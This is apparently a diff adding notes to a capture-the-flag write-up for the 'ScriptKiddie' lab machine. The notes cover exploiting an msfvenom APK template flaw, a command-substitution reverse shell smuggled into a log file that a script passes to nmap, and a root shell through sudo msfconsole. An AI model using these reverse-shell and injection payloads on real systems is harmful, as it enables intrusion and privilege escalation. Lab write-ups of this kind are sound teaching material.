@@ -22,8 +22,19 @@ bash: cannot set terminal process group (940): Inappropriate ioctl for device
 bash: no job control in this shell
 kid@scriptkiddie:~/html$ id
 ```
+Port 500
+> 3 apps running on it, nmap, msfvenom, searchsploit
+> msfvenom has vunl- https://github.com/CarsonShaffer/CVE-2020-7384/blob/main/CVE-2020-7384.sh
+> we create apk file with revershell, use it as input for msfvenom -x
+> exeute it on the web app, get a shell of user
 
-
+```
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 43862
+bash: cannot set terminal process group (937): Inappropriate ioctl for device
+bash: no job control in this shell
+```
 
 `kid@scriptkiddie:/home/pwn$ cat scanlosers.sh `
 ```
@@ -39,3 +50,45 @@ done
 if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
 
 ```
+
+in this script, read the content of logs.hackers, use the part after 2nd element as $ip to put behind nmap.
+Let us put a reverse shell in to hackers
+
+`echo 'x x $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")' > /home/kid/logs/hackers`
+The script will run
+`nmap $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")`
+$() works as  command substitution, the output of $() will sent to nmap. but $() will be executed.
+
+`└─$ nc -nvlp 8821`
+```
+listening on [any] 8821 ...
+connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 50582
+bash: cannot set terminal process group (832): Inappropriate ioctl for device
+bash: no job control in this shell
+
+pwn@scriptkiddie:~$ sudo -l
+sudo -l
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+```
+From gtfobins
+```
+sudo msfconsole
+msf6 > irb
+>> system("/bin/sh")
+```
+```
+>> 
+>> system("/bin/bash")
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root/
+```
+
+#### Lesson learned
+- for any input field has interactive function, check the function and version etc.
+- nmap(any command) $(payload), may use to run as the privi of owner
